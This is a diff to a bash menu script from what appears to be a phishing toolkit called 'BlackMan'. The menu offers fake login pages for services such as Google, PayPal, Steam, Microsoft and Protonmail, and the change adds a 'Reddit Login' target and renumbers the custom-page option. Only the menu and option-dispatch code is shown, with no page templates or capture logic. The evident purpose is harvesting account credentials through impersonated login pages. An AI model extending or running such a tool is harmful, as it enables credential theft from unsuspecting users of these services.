@@ -17,9 +17,9 @@ Main() {
     printf "          ${RED}[06]${CYAN} Google\e[0m         ${RED}[22]${CYAN} Twitch   \e[0m      ${RED}[38]${CYAN} Stackoverflow\e[0m         \n"
     printf "          ${RED}[07]${CYAN} Origin\e[0m         ${RED}[23]${CYAN} MySpace    \e[0m    ${RED}[39]${CYAN} Samsung ID\e[0m          \n"
     printf "          ${RED}[08]${CYAN} Yahoo\e[0m          ${RED}[24]${CYAN} Badoo   \e[0m       ${RED}[40]${CYAN} Tiktok\e[0m         \n"        
-    printf "          ${RED}[09]${CYAN} Linkedin\e[0m       ${RED}[25]${CYAN} VK   \e[0m          ${RED}[41]${CYAN} Custom Page\e[0m         \n"         
-    printf "          ${RED}[10]${CYAN} Protonmail\e[0m     ${RED}[26]${CYAN} Yandex   \e[0m      ${RED}[99]${CYAN} Exit BlackMan\e[0m    \n"
-    printf "          ${RED}[11]${CYAN} Wordpress\e[0m      ${RED}[27]${CYAN} devianART   \e[0m            \n"
+    printf "          ${RED}[09]${CYAN} Linkedin\e[0m       ${RED}[25]${CYAN} VK   \e[0m          ${RED}[41]${CYAN} Reddit Login\e[0m         \n"         
+    printf "          ${RED}[10]${CYAN} Protonmail\e[0m     ${RED}[26]${CYAN} Yandex   \e[0m      ${RED}[42]${CYAN} Custom Page\e[0m    \n"
+    printf "          ${RED}[11]${CYAN} Wordpress\e[0m      ${RED}[27]${CYAN} devianART   \e[0m   ${RED}[99]${CYAN} Exit BlackMan\e[0m         \n"
     printf "          ${RED}[12]${CYAN} Microsoft\e[0m      ${RED}[28]${CYAN} Wi-Fi   \e[0m                \n"
     printf "          ${RED}[13]${CYAN} IGFollowers\e[0m    ${RED}[29]${CYAN} PayPal  \e[0m                \n"
     printf "          ${RED}[14]${CYAN} Pinterest\e[0m      ${RED}[30]${CYAN} Steam  \e[0m                              \n"
@@ -189,13 +189,17 @@ Main() {
     start
 
     elif [[ $option == 41 ]]; then
+    website="reddit"
+    start
+
+    elif [[ $option == 42 ]]; then
     website="custom"
     createpage
     start
 
     elif [[ $option == 99 ]]; then
     sleep 1
-    printf "${RED}Good Bye ${GREEN}^_^"
+    printf "${RED}Good Bye ${GREEN}^_^\n"
     exit
     
     else 
